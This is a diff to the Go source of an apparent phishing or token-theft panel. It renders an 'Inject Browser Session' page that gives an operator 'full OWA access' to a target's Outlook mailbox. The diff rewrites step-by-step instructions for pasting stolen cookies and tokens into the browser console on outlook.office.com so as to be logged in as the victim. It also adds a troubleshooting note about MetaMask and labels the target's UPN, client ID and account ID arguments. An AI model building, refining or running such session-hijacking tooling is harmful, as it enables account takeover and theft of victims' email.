@@ -1335,17 +1335,20 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <a class="back" href="/dc/use/%s">&larr; Dashboard</a>
 <h1>Inject Browser Session</h1>
 <p class="sub">Full OWA access as <strong style="color:#fff">%s</strong> — cookies + tokens in one paste</p>
-<div class="card" style="border-color:#1a3a5c">
-<h2 style="color:#4a9fd4">Important — run script on the right page</h2>
-<p style="font-size:13px;color:#bbb;margin-bottom:12px">
-  <strong style="color:#fff">Do NOT open outlook.office.com/mail/</strong> — it immediately redirects you to Microsoft login and the script runs on the wrong domain. You must run the script while your browser is on <strong style="color:#fff">outlook.office.com</strong>.
+<div class="card" style="border-color:#7a2a2a;background:#1a0a0a">
+<h2 style="color:#e07070">Required: use a browser WITHOUT MetaMask</h2>
+<p style="font-size:13px;color:#cc8888;line-height:1.7">
+  MetaMask's <strong style="color:#fff">lockdown-install.js</strong> runs before any page script and destroys <code style="color:#f90">window.crypto</code>, causing OWA to fail with <code style="color:#f90">crypto_nonexistent</code>.<br>
+  <strong style="color:#fff">Use Chrome or Edge in a profile that does not have MetaMask installed.</strong> Firefox + MetaMask will never work.
 </p>
+</div>
+<div class="card" style="border-color:#1a3a5c">
+<h2 style="color:#4a9fd4">Steps</h2>
 <ol class="steps">
-<li>Click <strong>Copy Script</strong> below to copy the script</li>
-<li>Click <strong>Open OWA Auth Page</strong> — this opens a page that stays on <strong>outlook.office.com</strong> without redirecting</li>
-<li>Press <strong>F12</strong> → <strong>Console</strong> tab — confirm the URL bar still shows <strong>outlook.office.com</strong></li>
-<li>Paste (<strong>Ctrl+V</strong>) and press <strong>Enter</strong></li>
-<li>Then navigate to <a href="https://outlook.office.com/mail/" target="_blank" style="color:#0078d4">outlook.office.com/mail/</a> — you will be logged in as <strong>%s</strong></li>
+<li>In a browser <strong>without MetaMask</strong>, click <strong>Open OWA Auth Page</strong> — stays on outlook.office.com, does not redirect</li>
+<li>Press <strong>F12</strong> → <strong>Console</strong> tab — confirm URL bar still shows <strong>outlook.office.com</strong></li>
+<li>Click <strong>Copy Script</strong> below → paste in console → press <strong>Enter</strong></li>
+<li>Navigate to <a href="https://outlook.office.com/mail/" target="_blank" style="color:#0078d4">outlook.office.com/mail/</a> — logged in as <strong>%s</strong></li>
 </ol>
 </div>
 <div class="card">
@@ -1390,14 +1393,15 @@ ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999)
 ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
 </script>
 </body></html>`,
-		template.HTMLEscapeString(upn),
-		template.HTMLEscapeString(landingToken),
-		template.HTMLEscapeString(upn),
-		template.HTMLEscapeString(snippet),
-		template.HTMLEscapeString(upn),
-		template.HTMLEscapeString(owaClientID),
-		template.HTMLEscapeString(homeAccountID),
-		string(snippetJSON),
+		template.HTMLEscapeString(upn),           // 1. <title>
+		template.HTMLEscapeString(landingToken),   // 2. back link
+		template.HTMLEscapeString(upn),            // 3. sub-header "Full OWA access as"
+		template.HTMLEscapeString(upn),            // 4. step 5 "logged in as"
+		template.HTMLEscapeString(snippet),        // 5. textarea value
+		template.HTMLEscapeString(upn),            // 6. Target info card
+		template.HTMLEscapeString(owaClientID),    // 7. OWA Client ID info card
+		template.HTMLEscapeString(homeAccountID),  // 8. Home Account info card
+		string(snippetJSON),                       // 9. JS var snippet
 	)
 }
 
